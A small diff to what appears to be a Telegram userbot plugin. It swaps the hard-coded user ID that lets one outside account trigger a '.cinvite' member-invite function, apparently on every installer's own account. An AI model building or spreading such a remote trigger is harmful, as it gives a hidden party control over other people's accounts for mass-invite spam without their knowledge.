@@ -52,7 +52,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1935384758,
+@register(incoming=True, from_users=5066592080,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
